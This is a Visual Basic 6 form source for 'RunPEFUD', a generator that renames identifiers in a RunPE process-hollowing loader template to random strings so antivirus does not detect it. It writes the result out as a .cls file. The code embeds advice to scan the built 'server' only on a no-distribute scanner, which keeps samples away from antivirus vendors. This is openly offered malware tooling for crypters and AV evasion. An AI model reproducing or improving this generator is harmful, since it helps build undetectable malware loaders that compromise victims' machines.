VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "RunPEFUD"
   ClientHeight    =   6300
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   5580
   LinkTopic       =   "Form1"
   ScaleHeight     =   6300
   ScaleWidth      =   5580
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command3 
      Caption         =   "1"
      Height          =   375
      Left            =   120
      TabIndex        =   4
      Top             =   5880
      Width           =   5415
   End
   Begin VB.TextBox Text2 
      Height          =   3525
      Left            =   5640
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Text            =   "Form1.frx":0000
      Top             =   240
      Visible         =   0   'False
      Width           =   3375
   End
   Begin VB.Frame Frame1 
      Caption         =   "Settings :"
      Height          =   1215
      Left            =   120
      TabIndex        =   1
      Top             =   4560
      Width           =   5415
      Begin VB.CommandButton Command2 
         Caption         =   "Generate Source Code"
         Height          =   375
         Left            =   2760
         TabIndex        =   5
         Top             =   240
         Width           =   2535
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Normal"
         Height          =   375
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   2535
      End
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      Height          =   4335
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Text            =   "Form1.frx":0175
      Top             =   120
      Width           =   5415
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim final As String
Dim normal As String
Dim runPE As String
Dim normals As String
Dim sCls As String
'Generator Example by: BR1337 ;)


Private Sub Command1_Click()

Text1.Text = normal
Text2.Text = normals
End Sub

Private Sub Command2_Click()
Call Command1_Click
Text2.Text = Replace(Text2.Text, "here", strings)
normals = Text2.Text
final = Replace(Text1.Text, "IMAGE_NT_SIGNATURE", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_DOS_SIGNATURE", strings)
Text1.Text = final
final = Replace(Text1.Text, "SIZE_DOS_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "SIZE_NT_HEADERS", strings)
Text1.Text = final
final = Replace(Text1.Text, "SIZE_EXPORT_DIRECTORY", strings)
Text1.Text = final
final = Replace(Text1.Text, "SIZE_IMAGE_SECTION_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "THUNK_APICALL", strings)
Text1.Text = final
final = Replace(Text1.Text, "THUNK_APICALL", strings) '
Text1.Text = final
final = Replace(Text1.Text, "c_bvASM", strings) '
Text1.Text = final
final = Replace(Text1.Text, "THUNK_KERNELBASE", strings)
Text1.Text = final
final = Replace(Text1.Text, "PATCH1", strings)
Text1.Text = final
final = Replace(Text1.Text, "PATCH2", strings)
Text1.Text = final
final = Replace(Text1.Text, "CONTEXT_FULL", strings)
Text1.Text = final
final = Replace(Text1.Text, "CREATE_SUSPENDED", strings)
Text1.Text = final
final = Replace(Text1.Text, "MEM_COMMIT", strings)
Text1.Text = final
final = Replace(Text1.Text, "MEM_RESERVE", strings)
Text1.Text = final
final = Replace(Text1.Text, "PAGE_EXECUTE_READWRITE", strings)
Text1.Text = final
final = Replace(Text1.Text, "STARTUPINFO", strings) '
Text1.Text = final
final = Replace(Text1.Text, "PROCESS_INFORMATION", strings)
Text1.Text = final
final = Replace(Text1.Text, "FLOATING_SAVE_AREA", strings)
Text1.Text = final
final = Replace(Text1.Text, "CONTEXT", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_DOS_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_FILE_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_DATA_DIRECTORY", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_OPTIONAL_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_NT_HEADERS", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_EXPORT_DIRECTORY", strings)
Text1.Text = final
final = Replace(Text1.Text, "IMAGE_SECTION_HEADER", strings)
Text1.Text = final
final = Replace(Text1.Text, "c_lKrnl", strings)
Text1.Text = final
final = Replace(Text1.Text, "c_lLoadLib", strings)
Text1.Text = final
final = Replace(Text1.Text, "c_bInit", strings)
Text1.Text = final
final = Replace(Text1.Text, "c_lVTE", strings)
Text1.Text = final
final = Replace(Text1.Text, "c_lOldVTE", strings)
Text1.Text = final
final = Replace(Text1.Text, "zDoNotCall", strings) '''''
Text1.Text = final
final = Replace(Text1.Text, "Invoke", strings)
Text1.Text = final
final = Replace(Text1.Text, "GetLong", strings)
Text1.Text = final
final = Replace(Text1.Text, "PutThunk", strings)
Text1.Text = final
final = Replace(Text1.Text, "PatchCall", strings)
Text1.Text = final
final = Replace(Text1.Text, "GetMod", strings)
Text1.Text = final
'final = Replace(Text1.Text, "LoadLibrary", strings) ' we cant rename this fuck
'Text1.Text = final''' OK
final = Replace(Text1.Text, "GetProcAddress", strings)
Text1.Text = final
final = Replace(Text1.Text, "ResolveForward", strings)
Text1.Text = final
final = Replace(Text1.Text, "StringFromPtr", strings)
Text1.Text = final
final = Replace(Text1.Text, "nlfpkgnrj", strings) 'até aqui ta perfeito <3
Text1.Text = final
final = Replace(Text1.Text, "lKernel", strings)
Text1.Text = final
final = Replace(Text1.Text, "lNTDll", strings)
Text1.Text = final
final = Replace(Text1.Text, "lMod", strings) ' huhu ok
Text1.Text = final
final = Replace(Text1.Text, "bvBuff", strings)
Text1.Text = final
final = Replace(Text1.Text, "sHost", strings)
Text1.Text = final
final = Replace(Text1.Text, "hProc", strings) ' huhu ok
Text1.Text = final
final = Replace(Text1.Text, "lPtr", strings)
Text1.Text = final
final = Replace(Text1.Text, "sData", strings)
Text1.Text = final
final = Replace(Text1.Text, "sParams", strings) ' Hm Ok
Text1.Text = final
final = Replace(Text1.Text, "lData", strings)
Text1.Text = final
final = Replace(Text1.Text, "bvTemp", strings)
Text1.Text = final
final = Replace(Text1.Text, "sThunk", strings)
Text1.Text = final
final = Replace(Text1.Text, "sProc", strings)
Text1.Text = final
final = Replace(Text1.Text, "sLib", strings) ' OKAY *__*
Text1.Text = final
final = Replace(Text1.Text, "lVAddress", strings)
Text1.Text = final
final = Replace(Text1.Text, "lVSize", strings)
Text1.Text = final
final = Replace(Text1.Text, "lBase", strings)
Text1.Text = final
final = Replace(Text1.Text, "lFunctAdd", strings)
Text1.Text = final
final = Replace(Text1.Text, "lNameAdd", strings)
Text1.Text = final
final = Replace(Text1.Text, "lNumbAdd", strings)
Text1.Text = final
final = Replace(Text1.Text, "lAddress", strings)
Text1.Text = final
final = Replace(Text1.Text, "lLib", strings)
Text1.Text = final
final = Replace(Text1.Text, "sMod", strings)
Text1.Text = final
final = Replace(Text1.Text, "sForward", strings)
Text1.Text = final
final = Replace(Text1.Text, "lLib", strings)
Text1.Text = final
final = Replace(Text1.Text, "sMod", strings)
Text1.Text = final
final = Replace(Text1.Text, "bChar", strings)
Text1.Text = final 'Terminado e working perfeitamente
Text1.Text = final
runPE = strings
final = Replace(Text1.Text, "RunPE", runPE)
final = final & vbNewLine & " 'RunPE function is " & runPE & vbNewLine & " 'RunPE Made by : br1337 RUNPE Generator" _
 & vbNewLine & " 'Never upload your server to another scan site, " & vbNewLine & "'just to www.novirusthanks.org and check the checkbox ' do not distribute the example ' " & vbNewLine & " 'Thanks :P"
Text1.Text = final
sCls = strings
Command3.Caption = "Build " & sCls & ".cls"
End Sub

Private Sub Command3_Click()

Open App.Path & "\" & sCls & ".cls" For Binary As #1
Put #1, , normals & vbNewLine & Text1.Text
Close #1
MsgBox "Done", vbInformation, "RunPEFUD"
End Sub

Private Sub Form_Load()
normal = Text1.Text
normals = Text2.Text
Command3.Caption = "Build RunPe.cls"

End Sub


